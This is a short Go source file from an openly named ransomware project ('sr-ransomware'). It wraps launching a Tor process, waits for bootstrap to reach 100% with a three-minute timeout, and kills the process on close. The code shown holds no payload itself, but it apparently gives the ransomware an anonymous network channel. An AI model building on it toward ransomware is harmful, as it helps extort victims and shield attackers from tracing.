package exe

import (
    "os"
    "time"
    "bufio"
    "os/exec"
    "strings"

    "github.com/sug0/sr-ransomware/go/errors"
)

type Tor struct {
    cmd    *exec.Cmd
    path   string
    config string
}

func NewTor(path, config string) *Tor {
    return &Tor{path: path, config: config}
}

func (t *Tor) Close() error {
    if t.cmd != nil {
        t.cmd.Process.Signal(os.Kill)
        return errors.WrapIfNotNil(pkg, "error on tor wait", t.cmd.Wait())
    }
    return nil
}

func (t *Tor) bootstrap() error {
    r, w, err := os.Pipe()
    if err != nil {
        return errors.Wrap(pkg, "failed to create pipe", err)
    }
    defer w.Close()
    defer r.Close()
    t.cmd.Stdout = w
    err = t.cmd.Start()
    if err != nil {
        return errors.Wrap(pkg, "failed to start tor", err)
    }
    ch := make(chan struct{})
    go func() {
        br := bufio.NewReader(r)
        for {
            line, err := br.ReadString('\n')
            if err != nil || strings.Contains(line, "100%") {
                break
            }
        }
        close(ch)
    }()
    select {
    case <-ch:
        return nil
    case <-time.After(3 * time.Minute):
        return ErrTorStartFailed
    }
}
